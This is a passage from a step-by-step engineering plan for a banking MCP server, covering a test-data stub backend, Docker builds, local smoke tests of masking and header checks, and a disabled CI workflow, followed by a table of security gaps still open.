            "id": "txn_1",
            "account_id": "acc_7f3a",
            "booked_at": "2026-09-11T08:30:00Z",
            "amount": "-34.20",
            "currency": "EUR",
            "counterparty_name": "Acme Ltd",
            "counterparty_iban": "DE89370400440532013000",
            "description": "Card 4111111111114417 purchase",
        }
    ]
}
CARDS = {"cards": [{"id": "crd_1", "label": "Debit", "pan": "4111111111114417", "status": "active"}]}

app = Starlette(
    routes=[
        Route("/accounts", lambda r: JSONResponse(ACCOUNTS)),
        Route("/accounts/{account_id}/balance", lambda r: JSONResponse(BALANCE)),
        Route("/transactions", lambda r: JSONResponse(TRANSACTIONS)),
        Route("/cards", lambda r: JSONResponse(CARDS)),
    ]
)
```

The stub returns unmasked values on purpose. If the server ever forwards one, the golden test and a manual Inspector session both show it.

- [ ] **Step 2: Write the `Dockerfile`**

```dockerfile
FROM ghcr.io/astral-sh/uv:python3.12-bookworm-slim AS builder
WORKDIR /app
COPY pyproject.toml uv.lock ./
COPY packages/postern-core/pyproject.toml packages/postern-core/
RUN uv sync --frozen --no-dev --no-install-project
COPY . .
RUN uv sync --frozen --no-dev

FROM python:3.12-slim AS runtime
COPY --from=builder /app /app
ENV PATH="/app/.venv/bin:$PATH"
WORKDIR /app
USER 1000:1000

FROM runtime AS api
CMD ["uvicorn", "services.api.main:app", "--host", "0.0.0.0", "--port", "8080"]

FROM runtime AS confirm
CMD ["uvicorn", "services.confirm.main:app", "--host", "0.0.0.0", "--port", "8080"]
```

- [ ] **Step 3: Pin the base images by digest**

Handoff §12.2 requires digests, not tags. Resolve them and edit the two `FROM` lines:

```bash
docker buildx imagetools inspect ghcr.io/astral-sh/uv:python3.12-bookworm-slim --format '{{.Manifest.Digest}}'
docker buildx imagetools inspect python:3.12-slim --format '{{.Manifest.Digest}}'
```

Replace each tag with `image@sha256:<digest>`. Record the date and digests in `docs/decisions/0003-base-images.md`.

- [ ] **Step 4: Write `docker-compose.yml`**

```yaml
services:
  backend-stub:
    image: ghcr.io/astral-sh/uv:python3.12-bookworm-slim
    working_dir: /app
    volumes: ["./:/app"]
    command: uv run uvicorn stub.backend:app --host 0.0.0.0 --port 8081
    ports: ["8081:8081"]

  api:
    build: {context: ., target: api}
    environment:
      POSTERN_BACKEND_BASE_URL: http://backend-stub:8081
      POSTERN_JWKS_URI: ""
      POSTERN_TOKEN_ISSUER: ""
      POSTERN_STRICT_HEADERS: "0"
    ports: ["8080:8080"]
    depends_on: [backend-stub]
```

Empty `POSTERN_JWKS_URI` and `POSTERN_TOKEN_ISSUER` leave `auth=None`, so local development needs no token. That is acceptable only because the compose stack binds to localhost and holds no real data.

- [ ] **Step 5: Build the `api` target**

Run: `docker build --target api --platform linux/arm64 -t postern-api:dev .`
Expected: builds. Graviton on Fargate is the deployment target (handoff §12.2), so build arm64 locally on Apple silicon too.

- [ ] **Step 6: Note the `confirm` target will not build yet**

`services/confirm/main.py` does not exist in this plan. Building `--target confirm` produces an image whose `CMD` fails at start. That is intended and closes in Plan 3. Record it in `docs/decisions/0003-base-images.md` so nobody treats it as a bug.

- [ ] **Step 7: Commit**

```bash
git add Dockerfile .dockerignore docker-compose.yml stub/backend.py docs/decisions/0003-base-images.md
git commit -m "build: two-target image, pinned bases, and a local stub backend"
```

---

### Task 14: Inspector smoke test and the disabled CI workflow

**Files:**
- Create: `.github/workflows/ci.yml`
- Create: `docs/verification/2026-09-12-inspector-run.md`

- [ ] **Step 1: Run the stack**

Run: `docker compose up --build`
Expected: `api` listens on 8080, `backend-stub` on 8081.

- [ ] **Step 2: Drive it with MCP Inspector**

Run: `npx @modelcontextprotocol/inspector`
Connect to `http://localhost:8080/mcp` over Streamable HTTP. Confirm each of these and record the output in `docs/verification/2026-09-12-inspector-run.md`:

1. Five tools are listed: `banking_start_session`, `accounts.list`, `accounts.get_balance`, `transactions.list`, `cards.list`.
2. `banking_start_session` returns one account with `iban` `ES•• •••• 1332`.
3. `cards.list` returns `pan` `•••• 4417`, and the raw `4111111111114417` appears nowhere.
4. `transactions.list` returns `description` containing `[redacted]` and no `counterparty_iban` field.
5. `transactions.list` with `days: 4000` is rejected without reaching the backend.
6. The `tools/list` result carries `cacheScope: "private"`. **If it does not, or if `ttlMs` is absent or in the wrong unit, that is a real finding**: FastMCP's `cache_ttl` parameter unit is undocumented, and this is the step that determines it. Record the observed value and open a follow-up if it disagrees with `Settings.cache_ttl_ms`.

- [ ] **Step 3: Verify the header check against a live server**

```bash
curl -si http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -H 'Mcp-Method: tools/list' \
  -H 'Mcp-Name: cards.list' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"cards.list","arguments":{}}}'
```

Expected: `HTTP/1.1 400 Bad Request` and a body containing `"code": -32020`. The unit tests prove the middleware in isolation; this proves it is actually installed in the served app.

- [ ] **Step 4: Write the CI workflow, left disabled**

```yaml
# .github/workflows/ci.yml
name: ci
on:
  workflow_dispatch:
jobs:
  gates:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: astral-sh/setup-uv@v5
        with:
          enable-cache: true
      - run: uv sync --frozen
      - run: make lint
      - run: make fmt-check
      - run: make type
      - run: make imports
      - run: make lock
      - run: make test
```

`on: workflow_dispatch` only, so nothing fires on push. Actions minutes are billed on private repositories; `make ci` runs the same six gates locally for free. Add `push`/`pull_request` triggers when you decide to spend the minutes.

- [ ] **Step 5: Run the full gate set**

Run: `make ci`
Expected: `lint` clean, `fmt-check` prints an `N files already formatted` line, `type` clean, `imports` prints `Contracts: 1 kept, 0 broken.`, `lock` prints a `Resolved N packages` line, and `test` green across all test files.

- [ ] **Step 6: Commit**

```bash
git add .github/workflows/ci.yml docs/verification/2026-09-12-inspector-run.md
git commit -m "ci: local gate runner plus a manually-triggered workflow"
```

---

## What this plan deliberately does not establish

Do not let any of these read as done because the tests are green.

| Not established | Why it matters | Lands in |
|---|---|---|
| Any real authentication | `auth=None` locally; `JWTVerifier` is wired but never exercised against a real issuer | Plan 4 |
| The Vault read/write key split | `StubTokenMinter` returns a fake bearer string. The structural argument in handoff §6.2 is currently a lint rule plus tests, not an infrastructure property | Plan 3 |
| Consent | `banking_start_session` reports hardcoded consent; the tool catalog is not yet filtered by it, so §3.4's leak scenario is not yet testable | Plan 2 |
| Audit chain | No `audit_log`. The evidence a regulator asks for (handoff §9) does not exist | Plan 2 |
| Cross-customer enforcement (ZT-2) | The stub backend never checks the subject. **This is the critical path and it is answered by another team, not by this repo** | out of repo |
| Token issuer must never mint a `sub` shaped like a national id, account number or PAN (alongside ZT-2) | `CustomerRef`'s `^cust[:_][A-Za-z0-9]{1,60}$` still accepts `cust_ES9121000418450200051332` (an IBAN), `cust_12345678Z` (a Spanish DNI shape) and `cust_4111111111114417` (a PAN) as the suffix. This code can only check the namespace prefix; it cannot prove what the issuer mints. Tightening the suffix to the issuer's real minted-token shape is a question for the platform team, worded here as a requirement on them, not a defect in this code | out of repo |
| PCI DSS scope | `MaskedPan` masks in this process, so the server does hold a full PAN briefly. Open question §10.17 asks the domain teams for pre-masked projections | out of repo |
| Base64 sentinel header decoding | Documented deviation from the spec in `docs/decisions/0002` | Plan 4 |
| `Money` per-currency scale/precision enforcement | `Money` rejects more than 4 decimal places (Task 3, second security-review round), which closes every float-artifact shape measured, but not true per-currency precision: `Decimal("1.234")` (3 decimal places) for `"EUR"` (which allows only 2) is still accepted and serialized as given. Closing that needs an ISO 4217 minor-unit table (JPY is 0 decimal places, most currencies are 2, a few are 3), a data commitment beyond Task 3 | unscheduled |

## Self-review

Checked against the three source documents:

- **Spec coverage.** Handoff §11 steps 3 to 8 each map to a task: step 3 to Tasks 0 and 4, step 4 to Tasks 2 and 3, step 5 to Tasks 8 to 10 and 14, step 6 to Task 7, step 7 to Task 11, step 8 to Task 5. §3.4's per-user cache scope is Task 4 step 4 plus the Task 14 step 2 verification. Three of the four CI gates from §8.7 are live (golden masking, header/body, import-linter); the fourth, backend OpenAPI contract tests, has no backend OpenAPI artifact to test against yet and is listed above as not established.
- **Placeholders.** None. Every code step carries the code. The two "not built yet" items (`services/confirm/main.py`, backend contract tests) are named as deferred with the plan that covers them, not left as TODOs.
- **Type consistency.** `CustomerRef.value`, `CustomerResolver.__call__`, `BackendClient.get_json(path, *, customer, audience, params)`, `Money(amount, currency)`, `Account(ref, label, iban)`, `Balance(account_ref, amount, as_of)`, `Transaction(ref, account_ref, booked_at, amount, direction, counterparty_name, description)`, `Card(ref, label, pan, status)`, `SessionInfo(accounts, consents, write_enabled, confirmation_note)` are used identically in every task that touches them. `register(mcp, resolver, backend)` is the same signature across all four tool modules.
- **Known risk in the plan itself.** Task 8's assertion `result.structured_content["result"]` assumes FastMCP wraps a `list[Model]` return under a `result` key. That follows from the documented rule that non-object returns are wrapped, but list-of-model wrapping was not verified directly. If Task 8 step 7 fails on that key, read the actual shape from the failure and correct Tasks 8, 9 and 10 together; it does not change any implementation code.
